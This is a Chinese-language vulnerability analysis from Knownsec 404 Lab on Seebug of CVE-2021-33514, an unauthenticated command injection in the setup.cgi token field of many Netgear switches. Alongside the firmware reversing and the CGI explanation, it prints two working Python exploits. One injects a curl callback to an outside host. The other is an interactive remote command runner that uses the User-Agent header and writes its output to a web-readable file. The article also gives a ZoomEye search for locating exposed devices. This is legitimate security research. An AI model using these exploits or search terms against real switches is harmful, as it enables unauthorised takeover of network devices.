**作者：OneShell@知道创宇404实验室  
时间：2021年7月21日**

## 漏洞信息

CVE-2021-33514是发生在Netgear多款交换机上的命令注入漏洞，可以未认证远程代码执行，CVSS3：9.8（高危）。

漏洞产生的根本原因是libsal.so.0.0中的函数`sal_sys_ssoReturnToken_chk`存在命令注入，这个函数用于处理url中的`tocken`字段，直接将`tocken`传递到格式化字符串中，然后调用`popen`执行。后端处理setup.cgi加载了该so文件，并且在处理url的时候调用了该存在漏洞的函数。漏洞利用起来也非常简单，直接给cgi发送构造了命令的请求就可以。

Netgear官方给出的受漏洞影响设备和固件版本如下表：

影响设备 | 固件版本  
---|---  
GC108P | <=1.0.7.3  
GC108PP | <=1.0.7.3  
GS108Tv3 | <=7.0.6.3  
GS110TPP | <=7.0.6.3  
GS110TPv3 | <=7.0.6.3  
GS110TUP | <=1.0.4.3  
GS710TUP | <=1.0.4.3  
GS716TP | <=1.0.2.3  
GS716TPP | <=1.0.2.3  
GS724TPP | <=2.0.4.3  
GS724TPv2 | <=2.0.4.3  
GS728TPPv2 | <=6.0.6.3  
GS728TPv2 | <=6.0.6.3  
GS752TPPv1 | <=6.0.6.3  
GS752TPv2 | <=6.0.6.3  
MS510TXM | <=1.0.2.3  
MS510TXUP | <=1.0.2.3  
  
## 漏洞复现

复现过程仅仅使用了python的requests模块，设备使用的是放置在公网的GS110TPP，固件版本V7.0.1.16，使用的so和cgi程序关键代码差别不大，具有代表性。通过分析交换机固件发现里面常见的可以反弹shell的程序都木有，那验证命令执行就使用了curl，用它去访问我的公网VPS，如果nc检测到访问，说明发生了命令注入。

    
    
    import requests
    vul_url = 'https://X.X.X.X/cgi/setup.cgi?token=\';$(cat);\''
    payload = 'curl X.X.X.X.X:8080'
    try:
        res = requests.post(url=vul_url, data=payload, verify=False, timeout=10)
        print('[!] should not return any thing')
    except:
        print('[+] success!')

![](https://images.seebug.org/content/images/2021/07/7d63b766-188b-432d-8ca8-d127119815a2.png-w331s)

## 漏洞分析

### 固件提取

首先在Netgear官网上可以下载到存在漏洞的固件，必须赞扬一下Netgear，基本上以往的固件都可以下载到，而且几乎都是没有加密的，这对漏洞分析来说大大的好。下载到固件了按照流程`binwalk
-Me`一把梭，然后使用find就会发现，找不到存在漏洞的so文件也找不到存在调用so的cgi程序。仔细看解压出来可能的文件系统文件夹里面，其实还有modsqfs.img和sqfs.img两个文件，这还得binwalk继续梭了这两个文件，才能有得到存在漏洞的so和cgi。

![](https://images.seebug.org/content/images/2021/07/72569912-4adb-43e9-8604-60e46052a69b.png-w331s)

![](https://images.seebug.org/content/images/2021/07/ad48b7a4-b827-4763-a96c-f4398f308b87.png-w331s)

### 静态分析

流程上还是比较简单的。首先看一下`libsal.so`里面存在漏洞的函数`sal_sys_ssoReturnToken_chk`，下面是直接贴出来IDA反编译结果，可以看到直接将函数输入`a1`，格式化字符串到`v25`中，然后调用`popen`执行了`v25`。
![](https://images.seebug.org/content/images/2021/07/8df67f4d-cad4-483d-85ba-5788e3947255.png-w331s)

再看看`setup.cgi`中是如何调用这个函数的，这个地方注意，C语言的或逻辑是，如果前面的判定通过了，后续就不进行判定。第一个判定是检查`query_string`中是否含有`tocken`字符串，当我们构造了payload那么判定会失败，则继续执行后面使用逗号连接的C语句，调用漏洞函数。`strtok`函数用于使用特定字符分割字符串，详情使用可以参考函数说明，最终就把`tocken`字段的值赋值给`v9`。

![](https://images.seebug.org/content/images/2021/07/5a6c4296-1b84-47c4-9e13-3c3914860320.png-w331s)

### 关于CGI以及此处payload的写法

**CGI如何处理用户请求**

之前分析的路由器后端的程序，大多是某某httpd+cgi的做法，当时对于cgi程序如何获取到url传递的参数就仅仅有一个感性的认识：通过环境变量来进行传参，如果是GET请求，那么看环境变量`QUERY_STRING`，如果是POST请求，可能先从`CONTENT_LENGTH`获取数据长度，然后从`STDIN`中读取指定长度的数据。但对于cgi程序是如何执行的，与httpd之间的关系是什么，还是有点迷糊。于是找了一些文章大概看了下。

CGI（Common Gateway
Interface）实际上是一种约定，一种接口协议，可以使用c、python、lua、php来实现。WEB服务器会根据CGI的类型决定如何向CGI程序传递数据，一般都是通过标准输入/输出流和环境变量来与CGI程序进行数据传递。例如这个地方的WEB服务器使用的是lighthttpd，通过逆向可以找到有一个函数`http_cgi_headers`是用来传递给CGI程序的一些环境变量的。

![](https://images.seebug.org/content/images/2021/07/8f7dfca6-0a71-4909-ab26-d93903da66f7.gif-w331s)

如果是使用的POST方式，服务器设定`CONTENT_LENGTH`环境变量说明POST数据的有效数据字节数，然后CGI通过传递的这个环境变量，从标准输入`STDIN`中去读取数据。在POC里面，首先token字段值会被注入，然后`$(cat)`从从标准输入中去读取数据，而此时POST的数据也被传递到了标准输入中，那么就相当于直接执行了POST发出的数据。

**payload的另一种写法**

如上，是通过环境变量和标准输入传递参数给CGI的，最开始的payload是通过POST请求将数据通过标准输入传递给CGI，而且没有执行结果回显。那么接下来使用GET请求+环境变量+获取执行结果的方式重新来写一次payload。

首先确定将要执行的命令通过哪一个环境变量传入，这个地方选择了`User-Agent`环境变量，也是经常被使用到的一种方式。其次是决定通过何种方式进行回显，此处是将执行结果写入到`/webtmp/`文件夹的一个js文件中。由于`/webtmp/`文件夹和`/tmp/`是链接起来（固件文件系统中查看）的，因此写入到`/webtmp/`文件夹，然后使用URL访问`/tmp/`中的js文件即可。

    
    
    from requests.api import head
    import requests
    import random
    import string
    requests.packages.urllib3.disable_warnings()
    
    proxy = {
    }
    
    letters = string.ascii_letters
    vul_addr = 'https://X.X.X.X'
    vul_url = vul_addr + '/cgi/setup.cgi?token=\';$HTTP_USER_AGENT;\''
    random_str = ''.join(random.choice(letters) for i in range(10))
    
    cmd1 = input('InputCMD: ').replace(' ', '${IFS}')
    cmd2 = f'rm /tmp/{random_str}.js'.replace(' ', '${IFS}')
    
    payload1 = f'sh -c {cmd1}>/webtmp/{random_str}.js'
    payload2 = f'sh -c {cmd2}'
    
    header = {}
    
    try:
        header['User-Agent'] = payload1 # 注入命令并将结果写入到js文件
        res = requests.get(vul_url, headers=header, verify=False,
                           timeout=5, allow_redirects=False, proxies=proxy)
        if res.status_code == 200:
            print('[+] command send success')
            result_file = vul_addr + f'/tmp/{random_str}.js'
            result = requests.get(result_file, timeout=5,
                                  verify=False, allow_redirects=False, proxies=proxy) # 读取结果js文件
            print('[+] get result')
            print(result.text)
            print('[+] rm tmp result file')
            header['User-Agent'] = payload2
            res = requests.get(vul_url, headers=header, verify=False,
                               timeout=5, allow_redirects=False, proxies=proxy) # 删除结果js文件
    except Exception as e:
        print(e)

![](https://images.seebug.org/content/images/2021/07/bd4f83da-2966-4c2e-b94f-594262a9def3.png-w331s)

## 小结

这次的命令注入漏洞逻辑是比较简单的，注入点不需要很长的变量依赖分析。通过对于Netgear几次命令注入漏洞的分析，心中大概也清楚嵌入式设备中路由器大概是怎么获取用户请求数据，然后如何传递给CGI程序进行处理的。

## 使用zoomeye和pocsuite3

### 漏洞影响面

通过ZoomEye网络空间搜索引擎，搜索ZoomEye dork数据挖掘语法查看漏洞公网资产影响面。

[zoomeye dork](https://www.zoomeye.org/searchResult?q=%3Faj4%2BfileVer)
关键词："?aj4+fileVer"

![](https://images.seebug.org/content/images/2021/07/3c3febeb-a451-4143-bb65-1c698b794f41.png-w331s)

[漏洞影响面全球视角可视化](https://www.zoomeye.org/globalmap/%3Faj4%2BfileVer/all/0)

![](https://images.seebug.org/content/images/2021/07/5336ec7e-7e3f-460b-9661-1b1cb801715e.png-w331s)

### verify模式

![](https://images.seebug.org/content/images/2021/07/3b2d0222-bf89-431d-b63c-66b1e5507a33.png-w331s)

![](https://images.seebug.org/content/images/2021/07/6e9dd666-ee5b-4c39-b134-9a7157ec8cff.png-w331s)

### attack模式

![](https://images.seebug.org/content/images/2021/07/1832b109-76f8-46b3-8c28-fe0477199d21.png-w331s)

![](https://images.seebug.org/content/images/2021/07/72ee55d0-572d-4c48-aab4-45867f3dd8a3.png-w331s)

## 参考文献

  * <https://www.cnblogs.com/liuzhang/p/3929198.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1645/>

